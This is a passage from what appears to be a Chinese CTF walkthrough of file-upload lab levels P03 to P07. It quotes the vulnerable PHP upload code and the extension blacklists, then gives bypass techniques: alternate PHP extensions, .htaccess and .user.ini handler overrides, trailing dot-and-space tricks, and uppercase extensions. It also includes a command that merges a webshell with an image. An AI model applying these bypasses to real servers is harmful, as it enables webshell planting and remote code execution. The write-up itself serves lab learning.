title="P03"></a>P03</h2><p>这道题提示上传php后为：<em>不允许上传.asp,.aspx,.php,.jsp后缀文件！</em></p><p>这是文件黑名单，而目前大多数网址使用的文件上传服务都是白名单机制，而且非常严格；</p><p>后端php判断如下，这个判断一般是写在apache服务里的：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        <span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&#x27;.asp&#x27;</span>,<span class="string">&#x27;.aspx&#x27;</span>,<span class="string">&#x27;.php&#x27;</span>,<span class="string">&#x27;.jsp&#x27;</span>);</span><br><span class="line">        <span class="variable">$file_name</span> = trim(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">        <span class="variable">$file_name</span> = deldot(<span class="variable">$file_name</span>);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line">        <span class="variable">$file_ext</span> = strrchr(<span class="variable">$file_name</span>, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        <span class="variable">$file_ext</span> = strtolower(<span class="variable">$file_ext</span>); <span class="comment">//转换为小写</span></span><br><span class="line">        <span class="variable">$file_ext</span> = str_ireplace(<span class="string">&#x27;::$DATA&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$file_ext</span>);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line">        <span class="variable">$file_ext</span> = trim(<span class="variable">$file_ext</span>); <span class="comment">//收尾去空</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!in_array(<span class="variable">$file_ext</span>, <span class="variable">$deny_ext</span>)) &#123;</span><br><span class="line">            <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.date(<span class="string">&quot;YmdHis&quot;</span>).rand(<span class="number">1000</span>,<span class="number">9999</span>).<span class="variable">$file_ext</span>;            </span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file(<span class="variable">$temp_file</span>,<span class="variable">$img_path</span>)) &#123;</span><br><span class="line">                 <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;不允许上传.asp,.aspx,.php,.jsp后缀文件！&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = UPLOAD_PATH . <span class="string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其实它的过滤不完全，后缀只过滤掉了4个基础解析后缀，还有php3这种也能被解析成php文件的特殊文件后缀，俗称后缀绕过；</p><p>这道题如果是小皮环境，需要添加apache的httpd-conf内的php解析：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AddType application/x-httpd-php .php .php3 .php5 .phtml</span><br></pre></td></tr></table></figure><p>还需要切换php版本为ts；</p><p>实在懒可以用BUUCTF的 （</p><h2 id="P04"><a href="#P04" class="headerlink" title="P04"></a>P04</h2><p>用之前的方法，会提示：<em>此文件不允许上传！</em></p><p>查看源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        <span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&quot;.php&quot;</span>,<span class="string">&quot;.php5&quot;</span>,<span class="string">&quot;.php4&quot;</span>,<span class="string">&quot;.php3&quot;</span>,<span class="string">&quot;.php2&quot;</span>,<span class="string">&quot;.php1&quot;</span>,<span class="string">&quot;.html&quot;</span>,<span class="string">&quot;.htm&quot;</span>,<span class="string">&quot;.phtml&quot;</span>,<span class="string">&quot;.pht&quot;</span>,<span class="string">&quot;.pHp&quot;</span>,<span class="string">&quot;.pHp5&quot;</span>,<span class="string">&quot;.pHp4&quot;</span>,<span class="string">&quot;.pHp3&quot;</span>,<span class="string">&quot;.pHp2&quot;</span>,<span class="string">&quot;.pHp1&quot;</span>,<span class="string">&quot;.Html&quot;</span>,<span class="string">&quot;.Htm&quot;</span>,<span class="string">&quot;.pHtml&quot;</span>,<span class="string">&quot;.jsp&quot;</span>,<span class="string">&quot;.jspa&quot;</span>,<span class="string">&quot;.jspx&quot;</span>,<span class="string">&quot;.jsw&quot;</span>,<span class="string">&quot;.jsv&quot;</span>,<span class="string">&quot;.jspf&quot;</span>,<span class="string">&quot;.jtml&quot;</span>,<span class="string">&quot;.jSp&quot;</span>,<span class="string">&quot;.jSpx&quot;</span>,<span class="string">&quot;.jSpa&quot;</span>,<span class="string">&quot;.jSw&quot;</span>,<span class="string">&quot;.jSv&quot;</span>,<span class="string">&quot;.jSpf&quot;</span>,<span class="string">&quot;.jHtml&quot;</span>,<span class="string">&quot;.asp&quot;</span>,<span class="string">&quot;.aspx&quot;</span>,<span class="string">&quot;.asa&quot;</span>,<span class="string">&quot;.asax&quot;</span>,<span class="string">&quot;.ascx&quot;</span>,<span class="string">&quot;.ashx&quot;</span>,<span class="string">&quot;.asmx&quot;</span>,<span class="string">&quot;.cer&quot;</span>,<span class="string">&quot;.aSp&quot;</span>,<span class="string">&quot;.aSpx&quot;</span>,<span class="string">&quot;.aSa&quot;</span>,<span class="string">&quot;.aSax&quot;</span>,<span class="string">&quot;.aScx&quot;</span>,<span class="string">&quot;.aShx&quot;</span>,<span class="string">&quot;.aSmx&quot;</span>,<span class="string">&quot;.cEr&quot;</span>,<span class="string">&quot;.sWf&quot;</span>,<span class="string">&quot;.swf&quot;</span>,<span class="string">&quot;.ini&quot;</span>);</span><br><span class="line">        <span class="variable">$file_name</span> = trim(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">        <span class="variable">$file_name</span> = deldot(<span class="variable">$file_name</span>);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line">        <span class="variable">$file_ext</span> = strrchr(<span class="variable">$file_name</span>, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        <span class="variable">$file_ext</span> = strtolower(<span class="variable">$file_ext</span>); <span class="comment">//转换为小写</span></span><br><span class="line">        <span class="variable">$file_ext</span> = str_ireplace(<span class="string">&#x27;::$DATA&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$file_ext</span>);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line">        <span class="variable">$file_ext</span> = trim(<span class="variable">$file_ext</span>); <span class="comment">//收尾去空</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!in_array(<span class="variable">$file_ext</span>, <span class="variable">$deny_ext</span>)) &#123;</span><br><span class="line">            <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.<span class="variable">$file_name</span>;</span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file(<span class="variable">$temp_file</span>, <span class="variable">$img_path</span>)) &#123;</span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;此文件不允许上传!&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = UPLOAD_PATH . <span class="string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>和P03一样的检测，只不过堵死了大部分后缀，而黑名单里的话，其中有两个后缀很有意思，一个是htaccess，一个是ini，这道题没有禁前者；</p><h3 id="htaccess"><a href="#htaccess" class="headerlink" title=".htaccess"></a>.htaccess</h3><p>是一个服务器分布式配置文件，每个网址根目录都会有；</p><p>但相对于httpd.conf而言，httpd.conf是作用于全局，是apache的主要配置文件，影响整个服务器；</p><p>而.htaccess文件作用范围是局部的，常位于根目录和特定目录，只影响其所在的对应目录；</p><p>使用方法：.htaccess文件修改后即时生效，而Httpd.conf一般需要管理员级权限才能进行修改，修改需要重启apache服务器才能应用；</p><p>本题可以先上传一个.htaccess文件，里面配置这么一句话：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;FilesMatch &quot;Hack&quot;&gt;                      </span><br><span class="line">SetHandler application/x-httpd-php</span><br><span class="line">&lt;/FilesMatch&gt;</span><br></pre></td></tr></table></figure><p>检测名字叫Hack的文件以php形式解析；</p><p>或者</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AddType application/x-httpd-php .jpg .txt</span><br></pre></td></tr></table></figure><p>意思是使jpg和txt后缀按照php文件的内容进行解析执行；</p><p>那么在这个上传目录内，传入的jpg和txt便会按照php执行了（要求服务端开启.htaccess功能 httpd.conf 所有override改为 all）；</p><p>一般而言，直接改一句话木马的后缀为jpg，服务端很可能检测图片内容是否合法，所以可以使用命令合并一句话木马和一张图片来达成目的：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">copy muma.php+tupian.jpg/b new.jpg</span><br></pre></td></tr></table></figure><h2 id="P05"><a href="#P05" class="headerlink" title="P05"></a>P05</h2><p>前置知识</p><p>下面两个文件的关系和httpd.conf与.htaccess的关系类似，httpd.conf与.htaccess针对于apache服务器而言是有的；</p><p>而下面两个文件针对于php而言；</p><h3 id="user-ini"><a href="#user-ini" class="headerlink" title=".user.ini"></a>.user.ini</h3><p>特定于用户和特定目录的配置文件，常常位于web应用程序的根目录下，用于覆盖或追加全局配置文件(php.ini)中的php配置选项；</p><p>作用范围：相对目录及其子目录；</p><p>生效：修改即生效；</p><p>注意，此文件<strong>生效前提</strong>是php版本大于5.3.0，最好是<strong>7的版本</strong>，且Server API为 <strong>CGI/FastCGI</strong>；</p><h3 id="php-ini"><a href="#php-ini" class="headerlink" title="php.ini"></a>php.ini</h3><p>存储对整个php环境生效的配置选项，常位于php安装目录中；</p><p>作用范围：所有运行在该php环境中的php请求；</p><p>生效方式：重启php或者服务器；</p><p>此关为.user.ini上传漏洞，利用前置要求：**.user.ini生效<strong>，且上传目录</strong>已存在php文件**；</p><p>查看源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        <span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&quot;.php&quot;</span>,<span class="string">&quot;.php5&quot;</span>,<span class="string">&quot;.php4&quot;</span>,<span class="string">&quot;.php3&quot;</span>,<span class="string">&quot;.php2&quot;</span>,<span class="string">&quot;.html&quot;</span>,<span class="string">&quot;.htm&quot;</span>,<span class="string">&quot;.phtml&quot;</span>,<span class="string">&quot;.pht&quot;</span>,<span class="string">&quot;.pHp&quot;</span>,<span class="string">&quot;.pHp5&quot;</span>,<span class="string">&quot;.pHp4&quot;</span>,<span class="string">&quot;.pHp3&quot;</span>,<span class="string">&quot;.pHp2&quot;</span>,<span class="string">&quot;.Html&quot;</span>,<span class="string">&quot;.Htm&quot;</span>,<span class="string">&quot;.pHtml&quot;</span>,<span class="string">&quot;.jsp&quot;</span>,<span class="string">&quot;.jspa&quot;</span>,<span class="string">&quot;.jspx&quot;</span>,<span class="string">&quot;.jsw&quot;</span>,<span class="string">&quot;.jsv&quot;</span>,<span class="string">&quot;.jspf&quot;</span>,<span class="string">&quot;.jtml&quot;</span>,<span class="string">&quot;.jSp&quot;</span>,<span class="string">&quot;.jSpx&quot;</span>,<span class="string">&quot;.jSpa&quot;</span>,<span class="string">&quot;.jSw&quot;</span>,<span class="string">&quot;.jSv&quot;</span>,<span class="string">&quot;.jSpf&quot;</span>,<span class="string">&quot;.jHtml&quot;</span>,<span class="string">&quot;.asp&quot;</span>,<span class="string">&quot;.aspx&quot;</span>,<span class="string">&quot;.asa&quot;</span>,<span class="string">&quot;.asax&quot;</span>,<span class="string">&quot;.ascx&quot;</span>,<span class="string">&quot;.ashx&quot;</span>,<span class="string">&quot;.asmx&quot;</span>,<span class="string">&quot;.cer&quot;</span>,<span class="string">&quot;.aSp&quot;</span>,<span class="string">&quot;.aSpx&quot;</span>,<span class="string">&quot;.aSa&quot;</span>,<span class="string">&quot;.aSax&quot;</span>,<span class="string">&quot;.aScx&quot;</span>,<span class="string">&quot;.aShx&quot;</span>,<span class="string">&quot;.aSmx&quot;</span>,<span class="string">&quot;.cEr&quot;</span>,<span class="string">&quot;.sWf&quot;</span>,<span class="string">&quot;.swf&quot;</span>,<span class="string">&quot;.htaccess&quot;</span>);</span><br><span class="line">        <span class="variable">$file_name</span> = trim(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">        <span class="variable">$file_name</span> = deldot(<span class="variable">$file_name</span>);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line">        <span class="variable">$file_ext</span> = strrchr(<span class="variable">$file_name</span>, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        <span class="variable">$file_ext</span> = strtolower(<span class="variable">$file_ext</span>); <span class="comment">//转换为小写</span></span><br><span class="line">        <span class="variable">$file_ext</span> = str_ireplace(<span class="string">&#x27;::$DATA&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$file_ext</span>);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line">        <span class="variable">$file_ext</span> = trim(<span class="variable">$file_ext</span>); <span class="comment">//首尾去空</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (!in_array(<span class="variable">$file_ext</span>, <span class="variable">$deny_ext</span>)) &#123;</span><br><span class="line">            <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.<span class="variable">$file_name</span>;</span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file(<span class="variable">$temp_file</span>, <span class="variable">$img_path</span>)) &#123;</span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;此文件类型不允许上传！&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = UPLOAD_PATH . <span class="string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>一样的过滤方式，但没过滤.user.ini；</p><p>绕过写法：</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">Auto-prepend-file</span> = file.txt </span><br></pre></td></tr></table></figure><p>这个txt文件里只有php代码，当ini被加载后，这句话会使得这个目录下所有php文件<strong>自动包含</strong>这个file.txt里的内容，再执行；</p><p>包含进去的代码被贴到已有php文件之后；</p><h3 id="点加空格加点绕过"><a href="#点加空格加点绕过" class="headerlink" title="点加空格加点绕过"></a>点加空格加点绕过</h3><p>此题的另类绕过方法；</p><p><strong>Windows</strong>会将后缀名之后的.与空格自动删除；</p><p>这道题的绕过过程为：</p><ul><li>获取文件名</li><li>删除文件末尾的点</li><li>以点分割为一个后缀名</li><li>将后缀名转为小写</li><li>对后缀名去多余空格</li><li>判断</li></ul><p>当文件为file.php时，第三步获取到的文件后缀是.php,第一步获取的文件名为file.php；</p><p>但当文件为file.php. .时，第三步获取到的文件后缀是. ,第一步获取到的文件名为file.php. ;</p><p>所以可以绕过判断，并在上传后自动修正文件名为file.php;</p><h2 id="P06"><a href="#P06" class="headerlink" title="P06"></a>P06</h2><p>源码如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        <span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&quot;.php&quot;</span>,<span class="string">&quot;.php5&quot;</span>,<span class="string">&quot;.php4&quot;</span>,<span class="string">&quot;.php3&quot;</span>,<span class="string">&quot;.php2&quot;</span>,<span class="string">&quot;.html&quot;</span>,<span class="string">&quot;.htm&quot;</span>,<span class="string">&quot;.phtml&quot;</span>,<span class="string">&quot;.pht&quot;</span>,<span class="string">&quot;.pHp&quot;</span>,<span class="string">&quot;.pHp5&quot;</span>,<span class="string">&quot;.pHp4&quot;</span>,<span class="string">&quot;.pHp3&quot;</span>,<span class="string">&quot;.pHp2&quot;</span>,<span class="string">&quot;.Html&quot;</span>,<span class="string">&quot;.Htm&quot;</span>,<span class="string">&quot;.pHtml&quot;</span>,<span class="string">&quot;.jsp&quot;</span>,<span class="string">&quot;.jspa&quot;</span>,<span class="string">&quot;.jspx&quot;</span>,<span class="string">&quot;.jsw&quot;</span>,<span class="string">&quot;.jsv&quot;</span>,<span class="string">&quot;.jspf&quot;</span>,<span class="string">&quot;.jtml&quot;</span>,<span class="string">&quot;.jSp&quot;</span>,<span class="string">&quot;.jSpx&quot;</span>,<span class="string">&quot;.jSpa&quot;</span>,<span class="string">&quot;.jSw&quot;</span>,<span class="string">&quot;.jSv&quot;</span>,<span class="string">&quot;.jSpf&quot;</span>,<span class="string">&quot;.jHtml&quot;</span>,<span class="string">&quot;.asp&quot;</span>,<span class="string">&quot;.aspx&quot;</span>,<span class="string">&quot;.asa&quot;</span>,<span class="string">&quot;.asax&quot;</span>,<span class="string">&quot;.ascx&quot;</span>,<span class="string">&quot;.ashx&quot;</span>,<span class="string">&quot;.asmx&quot;</span>,<span class="string">&quot;.cer&quot;</span>,<span class="string">&quot;.aSp&quot;</span>,<span class="string">&quot;.aSpx&quot;</span>,<span class="string">&quot;.aSa&quot;</span>,<span class="string">&quot;.aSax&quot;</span>,<span class="string">&quot;.aScx&quot;</span>,<span class="string">&quot;.aShx&quot;</span>,<span class="string">&quot;.aSmx&quot;</span>,<span class="string">&quot;.cEr&quot;</span>,<span class="string">&quot;.sWf&quot;</span>,<span class="string">&quot;.swf&quot;</span>,<span class="string">&quot;.htaccess&quot;</span>,<span class="string">&quot;.ini&quot;</span>);</span><br><span class="line">        <span class="variable">$file_name</span> = trim(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">        <span class="variable">$file_name</span> = deldot(<span class="variable">$file_name</span>);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line">        <span class="variable">$file_ext</span> = strrchr(<span class="variable">$file_name</span>, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        <span class="variable">$file_ext</span> = str_ireplace(<span class="string">&#x27;::$DATA&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$file_ext</span>);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line">        <span class="variable">$file_ext</span> = trim(<span class="variable">$file_ext</span>); <span class="comment">//首尾去空</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!in_array(<span class="variable">$file_ext</span>, <span class="variable">$deny_ext</span>)) &#123;</span><br><span class="line">            <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.date(<span class="string">&quot;YmdHis&quot;</span>).rand(<span class="number">1000</span>,<span class="number">9999</span>).<span class="variable">$file_ext</span>;</span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file(<span class="variable">$temp_file</span>, <span class="variable">$img_path</span>)) &#123;</span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;此文件类型不允许上传！&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = UPLOAD_PATH . <span class="string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>无法使用之前的两种绕过，但是它没判断大写，所以这道题可以大写绕过；</p><h3 id="大写绕过"><a href="#大写绕过" class="headerlink" title="大写绕过"></a>大写绕过</h3><p>将后缀改为Php，PHP都可，只要不被匹配到；</p><h2 id="P07"><a href="#P07" class="headerlink" title="P07"></a>P07</h2><p>源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        <span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&quot;.php&quot;</span>,<span class="string">&quot;.php5&quot;</span>,<span class="string">&quot;.php4&quot;</span>,<span class="string">&quot;.php3&quot;</span>,<span class="string">&quot;.php2&quot;</span>,<span class="string">&quot;.html&quot;</span>,<span class="string">&quot;.htm&quot;</span>,<span class="string">&quot;.phtml&quot;</span>,<span class="string">&quot;.pht&quot;</span>,<span class="string">&quot;.pHp&quot;</span>,<span class="string">&quot;.pHp5&quot;</span>,<span class="string">&quot;.pHp4&quot;</span>,<span class="string">&quot;.pHp3&quot;</span>,<span class="string">&quot;.pHp2&quot;</span>,<span class="string">&quot;.Html&quot;</span>,<span class="string">&quot;.Htm&quot;</span>,<span class="string">&quot;.pHtml&quot;</span>,<span class="string">&quot;.jsp&quot;</span>,<span class="string">&quot;.jspa&quot;</span>,<span class="string">&quot;.jspx&quot;</span>,<span class="string">&quot;.jsw&quot;</span>,<span class="string">&quot;.jsv&quot;</span>,<span class="string">&quot;.jspf&quot;</span>,<span class="string">&quot;.jtml&quot;</span>,<span class="string">&quot;.jSp&quot;</span>,<span class="string">&quot;.jSpx&quot;</span>,<span class="string">&quot;.jSpa&quot;</span>,<span class="string">&quot;.jSw&quot;</span>,<span class="string">&quot;.jSv&quot;</span>,<span class="string">&quot;.jSpf&quot;</span>,<span class="string">&quot;.jHtml&quot;</span>,<span class="string">&quot;.asp&quot;</span>,<span class="string">&quot;.aspx&quot;</span>,<span class="string">&quot;.asa&quot;</span>,<span class="string">&quot;.asax&quot;</span>,<span class="string">&quot;.ascx&quot;</span>,<span class="string">&quot;.ashx&quot;</span>,<span class="string">&quot;.asmx&quot;</span>,<span class="string">&quot;.cer&quot;</span>,<span class="string">&quot;.aSp&quot;</span>,<span class="string">&quot;.aSpx&quot;</span>,<span class="string">&quot;.aSa&quot;</span>,<span class="string">&quot;.aSax&quot;</span>,<span class="string">&quot;.aScx&quot;</span>,<span class="string">&quot;.aShx&quot;</span>,<span class="string">&quot;.aSmx&quot;</span>,<span class="string">&quot;.cEr&quot;</span>,<span class="string">&quot;.sWf&quot;</span>,<span class="string">&quot;.swf&quot;</span>,<span class="string">&quot;.htaccess&quot;</span>,<span class="string">&quot;.ini&quot;</span>);</span><br><span class="line">        <span class="variable">$file_name</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">        <span class="variable">$file_name</span> = deldot(<span class="variable">$file_name</span>);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line">        <span class="variable">$file_ext</span> = strrchr(<span class="variable">$file_name</span>, <span class="string">&#x27;.&#x27;</span>);</span><br><span 